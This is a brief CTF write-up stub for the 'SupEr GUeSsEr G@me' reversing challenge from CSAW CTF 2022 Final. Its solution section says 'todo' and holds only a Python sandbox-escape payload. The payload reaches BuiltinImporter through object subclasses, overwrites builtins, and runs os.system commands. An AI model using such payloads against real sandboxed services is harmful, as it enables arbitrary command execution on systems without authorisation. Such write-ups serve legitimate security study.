---
title: "[Rev] SupEr GUeSsEr G@me [CSAW CTF 2022 Final]"
date: 2022-11-16 00:12:00
---

# Introduction

file [service.py](./src/service.py)

# Solution

todo

```
'''
[setattr([obj for obj in [x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('gc').get_objects() if ('__name__' in dir(obj)) and ('__main__' in obj.__name__)][0].__builtins__,'set',lambda x:[]),setattr([obj for obj in [x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('gc').get_objects() if ('__name__' in dir(obj)) and ('__main__' in obj.__name__)][0].__builtins__,'print',lambda y:[x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system('ls'))]
'''
```